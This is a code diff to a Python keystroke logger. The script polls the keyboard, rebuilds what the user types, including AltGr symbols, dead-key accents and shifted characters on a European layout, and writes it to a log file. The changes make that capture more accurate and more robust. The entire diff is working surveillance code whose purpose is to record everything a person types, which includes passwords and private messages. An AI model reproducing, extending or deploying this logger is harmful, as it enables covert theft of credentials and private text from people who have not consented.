@@ -109,7 +109,7 @@ VK_CODE = {'backspace': 0x08,
            'num_lock': 0x90,
            'scroll_lock': 0x91,
            'left_shift': 0xA0,
-           'right_shift ': 0xA1,
+           'right_shift': 0xA1,
            'left_control': 0xA2,
            'right_control': 0xA3,
            'left_menu': 0xA4,
@@ -171,7 +171,8 @@ shift_printable_non_alphanumeric = {
 }
 shift_printable_numeric = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
 shift_dead_keys = {'~': '^', u'\u00B4': '`'}
-alt_gr_numeric = ['}', '', '@', '', '', '', '', '{', '[', ']']
+alt_gr_numeric = ['}', '', '@', u'\u00A3', u'\u00A7', u'\u20AC', '', '{', '[', ']']
+alt_gr_non_numeric = {'e': u'\u20AC'}
 keysPressed = {}
 wasKeyPressedTheLastTimeWeChecked = {}
 keysDown = []
@@ -185,11 +186,16 @@ locks_state = {'caps_lock': False,
 buf = ""
 ctrl = ['left_control', 'right_control']
 alt = ['left_menu', 'right_menu']
+shift = ['left_shift', 'right_shift']
 
 
-def dead_key_handler(k, shift_state):
+def dead_key_handler(k, shift_state=0):
     global buf
     global dead_key
+
+    if k != u'\u00A8' and (ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed()):
+        return
+
     tilde = {
         'a': (u'\u00E3', u'\u00C3'),
         'o': (u'\u00F5', u'\u00D5'),
@@ -233,7 +239,7 @@ def dead_key_handler(k, shift_state):
         '^': circumflex,
         u'\u00B4': acute,
         '`': grave,
-        u'00A8': diaeresis
+        u'\u00A8': diaeresis
     }
 
     if dead_key in dead_keys:
@@ -254,13 +260,17 @@ def key_was_unpressed(k):
 def key_was_pressed(k):
     global dead_key
     keysDown.append(k)
-    if k == '+' and get_alt_gr_pressed():
-        dead_key = u'00A8'
-        return
 
-    if k in VK_DEAD_KEY_CODE:
-        if ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
+    if k in VK_DEAD_KEY_CODE or (k == '+' and get_alt_gr_pressed()):
+        if dead_key != '':
+            if k == '+' and get_alt_gr_pressed():
+                dead_key_handler(u'\u00A8')
+            else:
+                dead_key_handler(k)
+        elif ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
             dead_key = shift_dead_keys[k]
+        elif k == '+' and get_alt_gr_pressed():
+            dead_key = u'\u00A8'
         else:
             dead_key = k
         return
@@ -307,21 +317,23 @@ def log_char(key_down):
     global buf
 
     alt_gr = get_alt_gr_pressed()
-    # If alt gr, a control or an alt key are pressed, nothing is typed, unless in the case of an alt gr + key
-    # combination, so it's useless to go on except in that case
+    # If alt gr, a control, an alt or both shift keys are pressed, nothing is typed, unless in the case of an alt gr +
+    # key combination, so it's useless to go on except in that case
     if alt_gr:
         if is_numeric(key_down):
             buf += alt_gr_numeric[int(key_down)]
+        elif key_down in alt_gr_non_numeric:
+            buf += alt_gr_non_numeric[key_down]
         return
 
-    if ctrl_key_pressed() or alt_key_pressed():
+    if ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed():
         return
 
     if key_down == 'space_bar':
         buf += ' '
         return
     elif key_down == 'enter':
-        buf += '\n'
+        buf += '\r\n'
         return
     elif key_down == 'backspace':
         buf += '[backspace]'
@@ -335,12 +347,10 @@ def log_char(key_down):
 
     # Count the number of shift keys pressed to know what was typed
     shift_state = 0
-    if 'left_shift' in keysDown:
-        shift_state += 1
-    if 'right_shift' in keysDown:
-        shift_state += 1
 
     if is_alpha(key_down):
+        if ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
+            shift_state += 1
         if locks_state['caps_lock']:
             shift_state += 1
         if dead_key != '':
@@ -349,18 +359,21 @@ def log_char(key_down):
             buf += key_down.upper()
         else:
             buf += key_down.lower()
-    elif is_numeric(key_down):
-        if shift_state % 2 == 1:
-            buf += shift_printable_numeric[int(key_down)]
-        else:
+    else:
+        if dead_key != '':
+            dead_key_handler(key_down)
+        elif is_numeric(key_down):
+            if shift_state % 2 == 1:
+                buf += shift_printable_numeric[int(key_down)]
+            else:
+                buf += key_down
+        elif key_down in printable_non_alphanumeric:
+            if shift_state % 2 == 1:
+                buf += shift_printable_non_alphanumeric[key_down]
+            else:
+                buf += key_down
+        elif key_down in VK_NON_ASCII_CODE:
             buf += key_down
-    elif key_down in printable_non_alphanumeric:
-        if shift_state % 2 == 1:
-            buf += shift_printable_non_alphanumeric[key_down]
-        else:
-            buf += key_down
-    elif key_down in VK_NON_ASCII_CODE:
-        buf += key_down
 
 
 def get_alt_gr_pressed():
@@ -383,6 +396,10 @@ def alt_key_pressed():
     return (alt[0] in keysDown) or (alt[1] in keysDown)
 
 
+def shift_keys_pressed():
+    return (shift[0] in keysDown) and (shift[1] in keysDown)
+
+
 def init():
     set_locks_state()
     for key in all_keys:
@@ -398,6 +415,7 @@ def write_to_log():
             f.write(buf)
     except:
         write_to_log()
+        raise
 
 
 def main():
@@ -420,6 +438,7 @@ def main():
                     wasKeyPressedTheLastTimeWeChecked[k] = False
         except:
             write_to_log()
+            raise
     write_to_log()
 
 main()
